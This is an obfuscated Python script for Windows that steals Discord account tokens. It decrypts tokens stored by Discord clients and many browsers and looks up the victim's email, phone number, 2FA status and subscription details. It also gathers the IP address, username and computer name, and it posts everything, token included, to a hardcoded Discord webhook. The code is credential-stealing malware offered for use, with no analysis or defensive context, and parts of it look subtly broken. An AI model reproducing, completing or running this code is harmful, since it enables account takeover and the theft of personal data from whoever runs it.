lllllllllllllll, llllllllllllllI, lllllllllllllIl, lllllllllllllII, llllllllllllIll, llllllllllllIlI, llllllllllllIIl = IndexError, abs, __name__, open, bool, len, PermissionError

from base64 import b64decode as IIlIlIllIIIlII
from Crypto.Cipher import AES as lIlIIIIlIIllII
from win32crypt import CryptUnprotectData as IIIIlllIlIIlll
from os import getlogin as IlIIIllIllIlll, listdir as IllllIlIlIIIIl
from json import loads as IlIllllIIIlIlI
from re import findall as IIlIIllIlIlllI
from urllib.request import Request as IlIlllIIlIllIl, urlopen as llllIlllllIIII
from subprocess import Popen as llIllIllllIlII, PIPE as IlIlIIIlIllIIl
import requests as lIlIlIIlIIIIII, json as IllllIlIIlIlII, os as llIIIIllllIIlI
from datetime import datetime as IllllIIlIlIllI
IIlIIllIIlIllIllll = []
lllIlIlIlllIlIlIlI = []
lllIllIIlIlllIllII = []

def lIIlIlIlIIIIIlIIll(IlllIllIIlIIIIIIII, IlIIIIIlIIIIIIIIII):
    try:
        return lIlIIIIlIIllII.new(IIIIlllIlIIlll(IlIIIIIlIIIIIIIIII, None, None, None, 0)[1], lIlIIIIlIIllII.MODE_GCM, IlllIllIIlIIIIIIII[3:15]).lIIlIlIlIIIIIlIIll(IlllIllIIlIIIIIIII[15:])[:-16].decode()
    except:
        return 'Error'

def IlIlllIIlIlllllIlI():
    IIIllIIIlIlllIIIIl = 'None'
    try:
        IIIllIIIlIlllIIIIl = llllIlllllIIII(IlIlllIIlIllIl('https://api.ipify.org')).read().decode().strip()
    except:
        pass
    return IIIllIIIlIlllIIIIl

def lIIIIllllIIIllIllI():
    llIlllIlIlIIIlIIIl = llIllIllllIlII('wmic csproduct get uuid', shell=True, stdin=IlIlIIIlIllIIl, stdout=IlIlIIIlIllIIl, stderr=IlIlIIIlIllIIl)
    return (llIlllIlIlIIIlIIIl.stdout.read() + llIlllIlIlIIIlIIIl.stderr.read()).decode().split('\n')[1]

def lIlIlIIlIIllIIIIll():
    lIIlIlIIIlIIllllII = []
    lllIllIIlIlllIllII = []
    llIIlIlIIlllIIllIl = llIIIIllllIIlI.getenv('LOCALAPPDATA')
    lIlIIIIIIlllIlIlIl = llIIIIllllIIlI.getenv('APPDATA')
    llllIIIlIlIIllIIlI = llIIlIlIIlllIIllIl + '\\Google\\Chrome\\User Data'
    lIllIlIIIIIIIIlIlI = {'Discord': lIlIIIIIIlllIlIlIl + '\\discord', 'Discord Canary': lIlIIIIIIlllIlIlIl + '\\discordcanary', 'Lightcord': lIlIIIIIIlllIlIlIl + '\\Lightcord', 'Discord PTB': lIlIIIIIIlllIlIlIl + '\\discordptb', 'Opera': lIlIIIIIIlllIlIlIl + '\\Opera Software\\Opera Stable', 'Opera GX': lIlIIIIIIlllIlIlIl + '\\Opera Software\\Opera GX Stable', 'Amigo': llIIlIlIIlllIIllIl + '\\Amigo\\User Data', 'Torch': llIIlIlIIlllIIllIl + '\\Torch\\User Data', 'Kometa': llIIlIlIIlllIIllIl + '\\Kometa\\User Data', 'Orbitum': llIIlIlIIlllIIllIl + '\\Orbitum\\User Data', 'CentBrowser': llIIlIlIIlllIIllIl + '\\CentBrowser\\User Data', '7Star': llIIlIlIIlllIIllIl + '\\7Star\\7Star\\User Data', 'Sputnik': llIIlIlIIlllIIllIl + '\\Sputnik\\Sputnik\\User Data', 'Vivaldi': llIIlIlIIlllIIllIl + '\\Vivaldi\\User Data\\Default', 'Chrome SxS': llIIlIlIIlllIIllIl + '\\Google\\Chrome SxS\\User Data', 'Chrome': llllIIIlIlIIllIIlI + 'Default', 'Epic Privacy Browser': llIIlIlIIlllIIllIl + '\\Epic Privacy Browser\\User Data', 'Microsoft Edge': llIIlIlIIlllIIllIl + '\\Microsoft\\Edge\\User Data\\Defaul', 'Uran': llIIlIlIIlllIIllIl + '\\uCozMedia\\Uran\\User Data\\Default', 'Yandex': llIIlIlIIlllIIllIl + '\\Yandex\\YandexBrowser\\User Data\\Default', 'Brave': llIIlIlIIlllIIllIl + '\\BraveSoftware\\Brave-Browser\\User Data\\Default', 'Iridium': llIIlIlIIlllIIllIl + '\\Iridium\\User Data\\Default'}
    for (lIllIlllIlllIlIllI, IlIlllllIllllIIlll) in lIllIlIIIIIIIIlIlI.items():
        if not llIIIIllllIIlI.IlIlllllIllllIIlll.exists(IlIlllllIllllIIlll):
            continue
        try:
            with lllllllllllllII(IlIlllllIllllIIlll + f'\\Local State', 'r') as IlIlIIlIlIlIIlllII:
                lllIlIIIIllIIlIIlI = IlIllllIIIlIlI(IlIlIIlIlIlIIlllII.read())['os_crypt']['encrypted_key']
                IlIlIIlIlIlIIlllII.close()
        except:
            continue
        for IlIlIIlIlIlIIlllII in IllllIlIlIIIIl(IlIlllllIllllIIlll + f'\\Local Storage\\leveldb\\'):
            if not IlIlIIlIlIlIIlllII.endswith('.ldb') and IlIlIIlIlIlIIlllII.endswith('.log'):
                continue
            else:
                try:
                    with lllllllllllllII(IlIlllllIllllIIlll + f'\\Local Storage\\leveldb\\{IlIlIIlIlIlIIlllII}', 'r', errors='ignore') as IllIIlIlIllIIIIlll:
                        for IIIIllIIllIlIIIlll in IllIIlIlIllIIIIlll.readlines():
                            IIIIllIIllIlIIIlll.strip()
                            for lIlIlIIIIlIlIIlIll in IIlIIllIlIlllI('dQw4w9WgXcQ:[^.*\\[\'(.*)\'\\].*$][^\\"]*', IIIIllIIllIlIIIlll):
                                IIlIIllIIlIllIllll.append(lIlIlIIIIlIlIIlIll)
                except llllllllllllIIl:
                    continue
        for lllIIlllIlIIlllIll in IIlIIllIIlIllIllll:
            if lllIIlllIlIIlllIll.endswith('\\'):
                lllIIlllIlIIlllIll.replace('\\', '')
            elif lllIIlllIlIIlllIll not in lllIlIlIlllIlIlIlI:
                lllIlIlIlllIlIlIlI.append(lllIIlllIlIIlllIll)
        for llIIIIlIIIIlIllIll in lllIlIlIlllIlIlIlI:
            try:
                IlllIIIIlIlIlllIll = lIIlIlIlIIIIIlIIll(IIlIlIllIIIlII(llIIIIlIIIIlIllIll.split('dQw4w9WgXcQ:')[1]), IIlIlIllIIIlII(lllIlIIIIllIIlIIlI)[5:])
            except lllllllllllllll == 'Error':
                continue
            lllIllIIlIlllIllII.append(IlllIIIIlIlIlllIll)
            for lllIllIIIlIIlIIIII in lllIllIIlIlllIllII:
                if lllIllIIIlIIlIIIII not in lIIlIlIIIlIIllllII:
                    lIIlIlIIIlIIllllII.append(lllIllIIIlIIlIIIII)
                    lIlIIlllIlIlIIIlII = {'Authorization': IlllIIIIlIlIlllIll, 'Content-Type': 'application/json'}
                    try:
                        IIlIlIIIIllIlllIlI = lIlIlIIlIIIIII.get('https://discordapp.com/api/v6/users/@me', headers=lIlIIlllIlIlIIIlII)
                    except:
                        continue
                    if IIlIlIIIIllIlllIlI.status_code == 200:
                        IIllIIIlIllllIllII = IIlIlIIIIllIlllIlI.json()
                        IIIllIIIlIlllIIIIl = IlIlllIIlIlllllIlI()
                        IIIlIIllllIllllIlI = llIIIIllllIIlI.getenv('UserName')
                        IllIIlIIIIIllIlIlI = llIIIIllllIIlI.getenv('COMPUTERNAME')
                        IlllllllIIIlIlIlII = f"{IIllIIIlIllllIllII['username']}#{IIllIIIlIllllIllII['discriminator']}"
                        IlIlIIlIllIlIIIIIl = IIllIIIlIllllIllII['id']
                        llIllllIllIlIlIIll = IIllIIIlIllllIllII['email']
                        llllllllllllllIIlI = IIllIIIlIllllIllII['phone']
                        IlIIlIllIIlIIIIlIl = IIllIIIlIllllIllII['mfa_enabled']
                        IllllIllIIIlllIIII = False
                        IIlIlIIIIllIlllIlI = lIlIlIIlIIIIII.get('https://discordapp.com/api/v6/users/@me/billing/subscriptions', headers=lIlIIlllIlIlIIIlII)
                        lIlIlIlllllIIIllII = IIlIlIIIIllIlllIlI.json()
                        IllllIllIIIlllIIII = llllllllllllIll(llllllllllllIlI(lIlIlIlllllIIIllII) > 0)
                        IIIIlIllIIlIllIIII = 0
                        if IllllIllIIIlllIIII:
                            IllIllIIlllllllllI = IllllIIlIlIllI.strptime(lIlIlIlllllIIIllII[0]['current_period_end'].split('.')[0], '%Y-%m-%dT%H:%M:%S')
                            llIlIIllIIIlIlIIlI = IllllIIlIlIllI.strptime(lIlIlIlllllIIIllII[0]['current_period_start'].split('.')[0], '%Y-%m-%dT%H:%M:%S')
                            IIIIlIllIIlIllIIII = llllllllllllllI((llIlIIllIIIlIlIIlI - IllIllIIlllllllllI).days)
                        lllIIIIlIllllllIlI = f"**{IlllllllIIIlIlIlII}** *({IlIlIIlIllIlIIIIIl})*\n\n> :dividers: __Account Information__\n\tEmail: `{llIllllIllIlIlIIll}`\n\tPhone: `{llllllllllllllIIlI}`\n\t2FA/MFA Enabled: `{IlIIlIllIIlIIIIlIl}`\n\tNitro: `{IllllIllIIIlllIIII}`\n\tExpires in: `{(IIIIlIllIIlIllIIII if IIIIlIllIIlIllIIII else 'None')} day(s)`\n\n> :computer: __PC Information__\n\tIP: `{IIIllIIIlIlllIIIIl}`\n\tUsername: `{IIIlIIllllIllllIlI}`\n\tPC Name: `{IllIIlIIIIIllIlIlI}`\n\tPlatform: `{lIllIlllIlllIlIllI}`\n\n> :piñata: __Token__\n\t`{IlllIIIIlIlIlllIll}`\n\nuwu"
                        llllIlIlIIIlIIllII = IllllIlIIlIlII.dumps({'content': lllIIIIlIllllllIlI, 'username': 'uwu', 'avatar_url': 'https://cdn.discordapp.com/attachments/826581697436581919/982374264604864572/atio.jpg'})
                        try:
                            llllIIIIIIlIlIlllI = {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'}
                            lIlllIIlIlllIlIIlI = IlIlllIIlIllIl('https://discord.com/api/webhooks/1262040206702284941/6Id-v5cU-rE9UQYKU_wpwYxeNZKJB3XoBt51aTEfG29tZF_MgU8759wTPYoIxijUZhLU', data=llllIlIlIIIlIIllII.encode(), headers=llllIIIIIIlIlIlllI)
                            llllIlllllIIII(lIlllIIlIlllIlIIlI)
                        except:
                            continue
                else:
                    continue
if lllllllllllllIl == '__main__':
    lIlIlIIlIIllIIIIll()
